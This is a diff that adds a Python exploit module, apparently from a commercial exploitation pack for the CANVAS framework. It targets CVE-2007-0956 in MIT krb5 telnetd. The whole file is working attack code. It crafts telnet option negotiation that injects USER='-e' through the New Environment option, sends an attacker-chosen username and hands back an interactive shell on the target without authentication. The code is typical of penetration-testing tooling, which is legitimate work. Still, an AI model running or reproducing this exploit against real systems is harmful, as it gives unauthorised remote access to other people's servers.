@@ -1,0 +1,211 @@
+#! /usr/bin/env python
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007
+#
+
+import os,getopt
+import sys
+sys.path.append(".")
+sys.path.append("../../")
+sys.path.append('../../encoder')
+sys.path.append('./encoder')
+sys.path.append("../../shellcode")
+sys.path.append("./shellcode")
+sys.path.append("../../gui")
+sys.path.append("./gui")
+
+import socket
+import select
+import string
+import time
+from exploitutils import *
+from libs.ctelnetlib import Telnet
+sys.path.append('encoder')
+import addencoder
+sys.path.append("shellcode")
+import win32shell
+import canvasengine
+
+from tcpexploit import tcpexploit
+from msrpc import *
+from shelllistener import shelllistener
+from shelllistener import shellfromtelnet
+
+import unixShellNode
+
+DOCUMENTATION={}
+DOCUMENTATION["Date public"]="04/03/2007"
+DOCUMENTATION["VersionsAffected"] = "telnetd in all releases of MIT krb5, up to and including krb5-1.6"
+DOCUMENTATION["CERT Advisory"]="http://www.kb.cert.org/vuls/id/220816"
+DOCUMENTATION["CVE Name"]="CVE-2007-0956"
+DOCUMENTATION["CVE Url"]="http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2007-0956"
+DOCUMENTATION["References"]="http://web.mit.edu/kerberos/advisories/MITKRB5-SA-2007-001-telnetd.txt"
+DOCUMENTATION["Post-Exploit"]=""
+
+DESCRIPTION="MIT Krb5 telnetd allows login as arbitrary user"
+
+VERSION="1.0"
+
+PROPERTY = {}
+PROPERTY['TYPE'] = "Exploit"
+PROPERTY['SITE'] = "Remote"
+PROPERTY['ARCH'] = [ ["Linux"], ["Solaris"], ["AIX"] ]
+
+NAME="MIT Krb5 telnetd vulnerability"
+
+class theexploit(tcpexploit):
+    def __init__(self):
+        tcpexploit.__init__(self)
+        
+        self.setPort(23)
+        self.setHost("")
+        self.setVersion(1)
+        self.username=""
+        
+        self.name=NAME
+        return
+    
+    def IAC_neg(self):
+				self.log("[*] Sending telnet negotiation")
+        # Do Suppress Go Ahead
+				buf = s_binary("ff fd 03")
+				# Will Terminal Type
+				buf += s_binary("ff fb 18")
+				# Will Negotiate About Window Size
+				buf += s_binary("ff fb 1f")
+				# Will Terminal Speed
+				buf += s_binary("ff fb 20")
+				# Will Remote Flow Control
+				buf += s_binary("ff fb 21")
+				# Will Linemode
+				buf += s_binary("ff fb 22")
+				# Will New Environment Option
+				buf += s_binary("ff fb 27")
+				# Do Status
+				buf += s_binary("ff fd 05")
+
+				self.s.sendall(buf)
+				time.sleep(2)
+
+				# Suboption Begin: Negotiate About Window Size
+				buf = s_binary("ff fa 1f 00 80 00 30")
+				# Suboption End
+				buf += s_binary("ff f0")
+				# Won't Authentication Option
+				buf += s_binary("ff fc 25")
+
+				self.s.sendall(buf)
+				time.sleep(2)
+
+				# Don't Encryption Option
+				buf = s_binary("ff fe 26")
+				# Won't Encryption Option
+				buf += s_binary("ff fc 26")
+				# Won't X Display Location
+				buf += s_binary("ff fc 23")
+				# Won't Environment Option 
+				buf += s_binary("ff fc 24")
+
+				self.s.sendall(buf)
+				time.sleep(2)
+
+				# Suboption Begin: Terminal Speed
+				buf = s_binary("ff fa 20 00 33 38 34 30 30 2c 33 38 34 30 30")
+				# Suboption End
+				buf += s_binary("ff f0")
+				# Suboption Begin: New Environment Option
+				buf += s_binary("ff fa 27 00 00 55 53 45 52 01 2d 65")
+				# Suboption End
+				buf += s_binary("ff f0")
+				# Suboption Begin: Terminal Type
+				buf += s_binary("ff fa 18 00 6c 69 6e 75 78")
+				# Suboption End
+				buf += s_binary("ff f0")
+
+				self.s.sendall(buf)
+				time.sleep(2)
+
+				# Won't Echo
+				buf = s_binary("ff fc 01")
+
+				self.s.sendall(buf)
+				time.sleep(2)
+
+				# Do Echo
+				buf = s_binary("ff fd 01")
+
+				self.s.sendall(buf)
+				#time.sleep(1)
+
+				# Data: \000
+				buf = s_binary("00")
+
+				self.s.sendall(buf)
+				time.sleep(2)
+
+				# Data: \r\000
+				buf = s_binary("0d 00")
+
+				self.s.sendall(buf)
+				time.sleep(2)
+
+				return
+
+    def do_exploit(self):
+				self.log("[#] Send username %s" % self.username)
+				self.s.sendall("%s\n" % self.username)
+				time.sleep(1)
+				return
+
+    def run(self):
+				self.host=self.target.interface
+				self.port=int(self.argsDict.get("port",self.port))
+				self.username=self.argsDict.get("username",self.username)
+        
+				self.setInfo("%s attacking %s:%d"%(NAME,self.host,self.port))
+				#first make socket connection to target
+				self.log("Connecting to %s:%d"%(self.host,self.port))
+				#self.s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+				self.s = self.gettcpsock()
+				try:
+					self.s.connect((self.host, int(self.port)))
+				except:
+					self.log("Could not connect!")
+					self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
+					return 0
+
+				self.IAC_neg()
+				self.do_exploit()
+      
+        # need to add error checking
+				telnetshell = Telnet()
+				telnetshell.sock = self.s
+				try:
+					shell = shelllistener(shellfromtelnet(telnetshell))
+					node = unixShellNode.unixShellNode()
+					node.parentnode = self.argsDict["passednodes"][0]
+					node.shell = shell
+				except:
+					self.log("Connection closed during exploit - server is patched.")
+					self.setInfo("%s attacking %s:%d - done (failed)"%(NAME,self.host,self.port))
+					return None
+
+				self.setInfo("%s attacking %s:%d - done (success!)"%(NAME,self.host,self.port))
+				#shell should always be valid here....
+				return node
+
+    def usage(self):
+        print "Usage: "+sys.argv[0]+" -t target [ -p targetport ] -O username:username"
+        sys.exit()
+
+if __name__ == '__main__':
+    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
+    app = theexploit()
+    ret = standard_callback_commandline(app)
+    if ret not in [0,1,None]:
+        ret.interact()
+
